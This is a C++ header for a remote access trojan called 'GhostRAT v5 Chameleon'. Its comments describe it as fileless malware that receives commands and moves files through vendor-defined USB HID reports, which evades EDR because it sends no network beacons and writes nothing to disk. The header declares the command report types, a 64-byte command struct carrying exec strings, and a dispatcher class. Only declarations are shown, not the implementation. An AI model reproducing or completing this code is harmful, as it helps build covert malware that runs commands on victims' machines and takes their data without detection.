/**
 * GhostRAT v5 "Chameleon" — USB HID Report RAT
 * 
 * Core module: HID Report decoder and command dispatcher
 * Cross-platform (Windows + Linux)
 * Fileless: payload lives in USB device flash, not host disk
 * 
 * EDR Blind Spot: No network beaconing, no files on disk,
 *                 commands via USB HID vendor-defined reports
 */

#pragma once

#include <cstdint>
#include <string>
#include <functional>
#include <map>
#include <mutex>

namespace GhostRATv5 {

// HID Report types (vendor-defined, 0x01-0xFF)
enum class HidReportType : uint8_t {
    Command       = 0x01,  // Device → Host: command payload
    Result        = 0x02,  // Host → Device: base64-encoded result
    Heartbeat     = 0x03,  // Host → Device: device status
    FileTransfer  = 0x04,  // Bidirectional: chunked file data
    Trigger       = 0x05,  // Device → Host: activation sequence
    Keepalive     = 0x06,  // Host → Device: liveness ping
};

// Command structure (64-byte HID report payload)
#pragma pack(push, 1)
struct HidCommand {
    uint8_t  report_type;    // 0x01-0xFF
    uint8_t  seq_num;        // Sequence number for multi-report commands
    uint8_t  total_reports;  // Total reports in multi-report command
    uint8_t  command_id[4];  // Unique command identifier
    uint8_t  data[56];       // Command payload (base64, exec string, etc.)
};
#pragma pack(pop)

static_assert(sizeof(HidCommand) == 64, "HidCommand must be exactly 64 bytes");

// Command handler callback
using CommandHandler = std::function<std::string(const HidCommand& cmd)>;

class HidRatCore {
public:
    HidRatCore();
    ~HidRatCore();

    // Register a command handler for a specific report type
    void register_handler(HidReportType type, CommandHandler handler);

    // Process an incoming HID report (64 bytes)
    std::string process_report(const uint8_t* report, size_t len);

    // Build an outbound HID report (result, heartbeat, etc.)
    size_t build_report(HidReportType type, const std::string& data, uint8_t* out);

    // Set the poll interval (ms) for checking HID device
    void set_poll_interval(uint32_t ms);

    // Get the current poll interval
    uint32_t get_poll_interval() const;

    // Enable/disable DMA transfer mode
    void set_dma_mode(bool enabled);

    // Get DMA mode status
    bool is_dma_mode() const;

private:
    std::map<HidReportType, CommandHandler> handlers_;
    std::mutex mutex_;
    uint32_t poll_interval_ms_;
    bool dma_mode_;
    
    // Multi-report command buffer
    struct MultiReportState {
        uint8_t  command_id[4];
        uint8_t  total_reports;
        uint8_t  received_reports;
        std::string assembled_data;
    };
    std::map<uint32_t, MultiReportState> multi_report_buffers_;
};

} // namespace GhostRATv5
